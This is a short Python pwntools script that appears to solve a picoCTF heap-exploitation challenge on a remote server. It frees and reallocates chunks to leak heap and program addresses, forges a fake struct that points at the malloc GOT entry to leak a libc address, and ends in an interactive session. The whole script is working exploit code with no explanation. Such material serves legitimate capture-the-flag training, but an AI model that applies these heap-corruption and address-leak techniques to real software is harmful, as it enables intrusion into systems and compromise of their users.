from pwn import *

HOST, PORT = 'mars.picoctf.net', 31638
r = remote(HOST, PORT)

r.sendlineafter('choice: \n', '0 0 0')
r.sendlineafter('choice: \n' , '1 0 24')
r.sendline(' '.join(['65' for i in range(24)]))
for i in range(6):
    r.sendlineafter('choice: \n', f'0 {i+1} 0')
r.sendlineafter('choice: \n', '4 1')
r.sendlineafter('choice: \n', '4 2')
r.sendlineafter('choice: \n', '4 0')
r.sendline('2 0')
r.recvuntil('choice: \n')
heap_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
heap = heap_leak - 0x13cf0

r.sendlineafter('choice: \n', '0 0 0')
r.sendlineafter('choice: \n', '1 0 24')
r.sendline(' '.join(['65' for i in range(24)]))
r.sendlineafter('choice: \n', '4 3')
r.sendlineafter('choice: \n', '4 0')
r.sendlineafter('choice: \n', '0 1 0')
r.sendline('2 0')
r.recvuntil('choice: \n')
program_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
program = program_leak - 0x202ce8

malloc_got = program + 0x202f88
r.sendlineafter('choice: \n', '0 0 0')
r.sendlineafter('choice: \n', '0 1 0')
r.sendlineafter('choice: \n', '4 0')
r.sendlineafter('choice: \n', '1 1 24')
fake_student = b'A' * 8 + p64(malloc_got) + p64(8)
r.sendline(' '.join([str(fake_student[i]) for i in range(24)]))
r.sendlineafter('choice: \n', '2 0')
libc_malloc = u64(r.recvline().strip().ljust(8, b'\x00'))
libc = libc_malloc - 0x97140

r.interactive()